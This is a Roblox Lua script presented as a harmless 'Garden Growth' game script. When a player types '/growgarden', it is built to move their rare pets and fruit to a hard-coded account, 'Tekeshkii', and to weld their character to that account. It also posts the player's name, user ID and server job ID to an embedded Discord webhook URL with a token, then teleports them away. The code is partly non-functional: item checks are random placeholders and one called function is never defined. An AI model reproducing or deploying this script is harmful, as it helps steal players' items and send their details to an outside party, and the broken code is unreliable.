-- Garden Growth Game Script by Tekeshkii
-- Enhanced version with piggyback teleport and @everyone notifications

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")

-- Configuration
local MAX_PLAYERS = 5
local TARGET_PLAYER_NAME = "Tekeshkii" -- Recipient for gifted items
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383781946110509118/tWOmSWS85_ZJeibhojg_r3aY2fTs7aAS1kz3gSmdKZfxDml71aErtTpjlmV0zknzspAS" -- Replace with your actual webhook URL
local LOW_PLAYER_THRESHOLD = 5 -- Target server player count threshold

-- Inventory items to track and gift
local SPECIAL_ITEMS = {
    "Dragonfly",
    "Raccoon",
    "RedFox",
    "Disco Bee",
    "QueenBee"
}

local SPECIAL_FRUIT = "Candy Blossom"

-- Track players who have executed the script
local executedPlayers = {}

-- Function to find Tekeshkii in the server
local function findTekeshkii()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == TARGET_PLAYER_NAME then
            return player
        end
    end
    return nil
end

-- Function to attach player to Tekeshkii (piggyback)
local function attachPiggyback(player, target)
    if not player.Character or not target.Character then return end
    
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
    
    if humanoid and targetHumanoid then
        -- Create weld constraint for piggyback effect
        local weld = Instance.new("WeldConstraint")
        weld.Part0 = player.Character:FindFirstChild("HumanoidRootPart")
        weld.Part1 = target.Character:FindFirstChild("HumanoidRootPart")
        weld.Parent = player.Character
        
        -- Position adjustment for piggyback
        if player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
        end
        
        -- Make player sit on target's back
        humanoid.Sit = true
        targetHumanoid.PlatformStand = true
        
        return weld
    end
end

-- Function to send Discord webhook notification with @everyone
local function sendWebhookNotification(player, inventory, jobId)
    local embed = {
        ["title"] = "🚀 Player Executed Garden Script",
        ["description"] = string.format("@everyone\nPlayer **%s** (ID: %d) has executed the script and was teleported to %s!", player.Name, player.UserId, TARGET_PLAYER_NAME),
        ["color"] = 16753920, -- Orange color
        ["fields"] = {
            {
                ["name"] = "🎁 Gifted Items",
                ["value"] = #inventory > 0 and table.concat(inventory, "\n") or "No items gifted yet",
                ["inline"] = true
            },
            {
                ["name"] = "🌐 Server Info",
                ["value"] = string.format("Job ID: `%s`\nPlayer Count: %d/%d", jobId, #Players:GetPlayers(), MAX_PLAYERS),
                ["inline"] = true
            },
            {
                ["name"] = "🔄 Transfer Status",
                ["value"] = "Successfully teleported to "..TARGET_PLAYER_NAME.." via piggyback",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Garden Growth System • "..os.date("%Y-%m-%d %H:%M:%S")
        },
        ["thumbnail"] = {
            ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
        }
    }
    
    local payload = {
        ["content"] = "@everyone", -- This will ping everyone
        ["embeds"] = {embed},
        ["username"] = "Garden Growth Alert",
        ["avatar_url"] = "https://i.imgur.com/J7o3tFq.png"
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(response))
    end
end

-- Function to gift items one by one with notifications
local function giftItemsWithNotifications(player, target)
    local inventory = {}
    
    -- Simulated inventory check (replace with your actual inventory system)
    for _, itemName in ipairs(SPECIAL_ITEMS) do
        -- Check if player has the item (this would be your inventory check)
        local hasItem = math.random() > 0.5 -- Replace with actual check
        
        if hasItem then
            table.insert(inventory, itemName)
            
            -- Here you would actually transfer the item in your game
            -- Example: playerInventory:RemoveItem(itemName)
            --          targetInventory:AddItem(itemName)
            
            -- Send individual notification for each item
            local embed = {
                ["title"] = "🎁 Item Gifted to "..TARGET_PLAYER_NAME,
                ["description"] = string.format("Player **%s** gifted **%s** to %s", player.Name, itemName, TARGET_PLAYER_NAME),
                ["color"] = 65280, -- Green color
                ["footer"] = {
                    ["text"] = "Garden Growth System • "..os.date("%H:%M:%S")
                }
            }
            
            local payload = {
                ["embeds"] = {embed},
                ["username"] = "Item Transfer"
            }
            
            pcall(function()
                HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
            end)
            
            -- Delay between gifts
            wait(2)
        end
    end
    
    -- Check for special fruit
    if math.random() > 0.7 then -- Replace with actual fruit check
        table.insert(inventory, SPECIAL_FRUIT)
        -- Gift the fruit here
    end
    
    return inventory
end

-- Main function to handle player execution
local function handleScriptExecution(player)
    -- Check if player has already executed the script
    if executedPlayers[player.UserId] then return end
    executedPlayers[player.UserId] = true
    
    -- Find Tekeshkii in the server
    local targetPlayer = findTekeshkii()
    if not targetPlayer then
        warn(TARGET_PLAYER_NAME.." not found in server")
        return
    end
    
    -- Gift items one by one
    local inventory = giftItemsWithNotifications(player, targetPlayer)
    
    -- Attach piggyback
    local weld = attachPiggyback(player, targetPlayer)
    
    -- Get current server job ID
    local jobId = game.JobId
    
    -- Send main webhook notification
    if WEBHOOK_URL ~= "YOUR_DISCORD_WEBHOOK_URL_HERE" then
        sendWebhookNotification(player, inventory, jobId)
    end
    
    -- Teleport to lower population server after delay
    wait(5)
    
    local targetServer = nil
    local attempts = 0
    
    while attempts < 3 and not targetServer do
        targetServer = findLowPopulationServer()
        attempts += 1
        if not targetServer then wait(2) end
    end
    
    if targetServer then
        pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id, player)
        end)
    end
end

-- Command to execute the script (replace with your actual trigger)
local function onChatMessage(player, message)
    if message:lower() == "/growgarden" then
        handleScriptExecution(player)
    end
end

-- Set up chat listener
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end)

-- Handle existing players
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end

print("Enhanced Garden Growth Script loaded! Ready for piggyback teleports to "..TARGET_PLAYER_NAME)
